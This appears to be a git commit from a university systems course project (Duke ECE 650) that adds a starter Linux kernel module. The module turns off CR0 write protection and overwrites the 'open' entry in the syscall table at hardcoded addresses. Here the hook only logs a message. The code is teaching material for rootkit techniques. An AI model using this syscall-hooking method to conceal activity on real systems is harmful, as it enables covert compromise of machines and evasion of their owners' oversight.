3439e151209743934e721048cc9159c703737d19
yy258 <yy258@duke.edu>
2020-04-10 21:13:16 -0400

    init

---
+++ Proj5_Rootkit/.tmp_versions/sneaky_mod.mod
@@ -0,0 +1,3 @@
+/home/yy258/ece650/Duke-ECE-650/Proj5_Rootkit/sneaky_mod.ko
+/home/yy258/ece650/Duke-ECE-650/Proj5_Rootkit/sneaky_mod.o
+
---
+++ Proj5_Rootkit/sneaky_mod.c
@@ -0,0 +1,98 @@
+#include <asm/cacheflush.h>
+#include <asm/current.h>  // process information
+#include <asm/page.h>
+#include <asm/unistd.h>     // for system call constants
+#include <linux/highmem.h>  // for changing page permissions
+#include <linux/init.h>     // for entry/exit macros
+#include <linux/kallsyms.h>
+#include <linux/kernel.h>  // for printk and other kernel bits
+#include <linux/module.h>  // for all modules
+#include <linux/sched.h>
+
+//Macros for kernel functions to alter Control Register 0 (CR0)
+//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
+//Bit 0 is the WP-bit (write protection). We want to flip this to 0
+//so that we can change the read/write permissions of kernel pages.
+#define read_cr0() (native_read_cr0())
+#define write_cr0(x) (native_write_cr0(x))
+
+//These are function pointers to the system calls that change page
+//permissions for the given address (page) to read-only or read-write.
+//Grep for "set_pages_ro" and "set_pages_rw" in:
+//      /boot/System.map-`$(uname -r)`
+//      e.g. /boot/System.map-4.4.0-116-generic
+void (*pages_rw)(struct page * page, int numpages) = (void *)0xffffffff810707b0;
+void (*pages_ro)(struct page * page, int numpages) = (void *)0xffffffff81070730;
+
+//This is a pointer to the system call table in memory
+//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
+//We're getting its adddress from the System.map file (see above).
+static unsigned long * sys_call_table = (unsigned long *)0xffffffff81a00200;
+
+//Function pointer will be used to save address of original 'open' syscall.
+//The asmlinkage keyword is a GCC #define that indicates this function
+//should expect ti find its arguments on the stack (not in registers).
+//This is used for all system calls.
+asmlinkage int (*original_call)(const char * pathname, int flags);
+
+//Define our new sneaky version of the 'open' syscall
+asmlinkage int sneaky_sys_open(const char * pathname, int flags) {
+  printk(KERN_INFO "Very, very Sneaky!\n");
+  return original_call(pathname, flags);
+}
+
+//The code that gets executed when the module is loaded
+static int initialize_sneaky_module(void) {
+  struct page * page_ptr;
+
+  //See /var/log/syslog for kernel print output
+  printk(KERN_INFO "Sneaky module being loaded.\n");
+
+  //Turn off write protection mode
+  write_cr0(read_cr0() & (~0x10000));
+  //Get a pointer to the virtual page containing the address
+  //of the system call table in the kernel.
+  page_ptr = virt_to_page(&sys_call_table);
+  //Make this page read-write accessible
+  pages_rw(page_ptr, 1);
+
+  //This is the magic! Save away the original 'open' system call
+  //function address. Then overwrite its address in the system call
+  //table with the function address of our new code.
+  original_call = (void *)*(sys_call_table + __NR_open);
+  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+
+  //Revert page to read-only
+  pages_ro(page_ptr, 1);
+  //Turn write protection mode back on
+  write_cr0(read_cr0() | 0x10000);
+
+  return 0;  // to show a successful load
+}
+
+static void exit_sneaky_module(void) {
+  struct page * page_ptr;
+
+  printk(KERN_INFO "Sneaky module being unloaded.\n");
+
+  //Turn off write protection mode
+  write_cr0(read_cr0() & (~0x10000));
+
+  //Get a pointer to the virtual page containing the address
+  //of the system call table in the kernel.
+  page_ptr = virt_to_page(&sys_call_table);
+  //Make this page read-write accessible
+  pages_rw(page_ptr, 1);
+
+  //This is more magic! Restore the original 'open' system call
+  //function address. Will look like malicious code was never there!
+  *(sys_call_table + __NR_open) = (unsigned long)original_call;
+
+  //Revert page to read-only
+  pages_ro(page_ptr, 1);
+  //Turn write protection mode back on
+  write_cr0(read_cr0() | 0x10000);
+}
+
+module_init(initialize_sneaky_module);  // what's called upon loading
+module_exit(exit_sneaky_module);        // what's called upon unloading
